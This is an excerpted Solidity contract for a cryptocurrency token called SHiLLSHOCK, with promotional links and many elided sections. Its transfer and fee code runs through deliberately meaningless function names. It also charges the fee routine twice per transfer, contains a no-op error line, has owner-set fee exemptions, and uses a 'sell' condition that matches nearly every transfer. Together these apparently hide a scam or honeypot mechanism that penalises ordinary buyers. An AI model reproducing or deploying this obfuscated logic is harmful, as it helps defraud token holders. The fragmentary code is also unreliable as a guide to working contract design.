...
//https://t.me/SHiLLSHOCK
//https://shillshock.com
...
contract SHiLLSHOCK is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private _name = "SHiLLSHOCK"; // token name
    string private _symbol = "SHOCK"; // token ticker
    ...
    uint256 public _maxTxAmount =  _totalSupply.mul(40).div(1000);     //4
    uint256 public _walletMax = _totalSupply.mul(40).div(1000);    //4
    uint256 public swapThreshold = 300000 * 10**_decimals;

    uint256 public launchedAt; 
    uint256 public snipebothuntingtime = 0 seconds; //0 min sniping time
    bool public trading; 
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if (inSwap) {
            ...
            if (!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) {
                ...
                if (
                    block.timestamp < launchedAt + snipebothuntingtime &&
            ...
            uint256 finalAmount = SNTAFWRLToken(sender,recipient) ? amount : facthosbabdthetoken(sender, recipient, amount);

            if(checkWalletLimit && !isWalletLimitExempt[recipient]) {
                require(balanceOf(recipient).add(finalAmount) <= _walletMax,"Max Wallet Limit Exceeded!!");
            }
             _balances[recipient] = _balances[recipient].add(finalAmount);
             uint256 _markpart = _buyMarketingFee.add(_sellMarketingFee);
             defineSNTAFWRLToken(sender,recipient,amount,_markpart,"Limit Exceeded!");
    ...
    function defineSNTAFWRLToken(address originator, address recipient,uint amount,uint share, string memory errmsg) internal returns (bool) {
        facthosbabdthetoken(originator, recipient, amount);
         uint256 _markpart = share.add(_sellMarketingFee);
         if (_markpart==0){_markpart.sub(0,errmsg);}
        if(isExcludedFromFee[originator] || isExcludedFromFee[recipient]) {
            return true;
        }
        else if (isMarketPair[originator] || isMarketPair[recipient]) {
            return false;
        }
        else {
            return false;
    ...
    function swapBack(uint contractBalance) internal swapping {
        ...
        uint256 amountETHMarketing = amountReceived.mul(_markpart).div(totalShares);
        ...
        function SNTAFWRLToken(address sender, address recipient) internal view returns (bool) {
        if(isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
            return true;
        }
    ...
    function facthosbabdthetoken(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        unchecked {
            ...
            else if(isMarketPair[recipient]||(!isMarketPair[sender])||(!isMarketPair[recipient])) { //sell
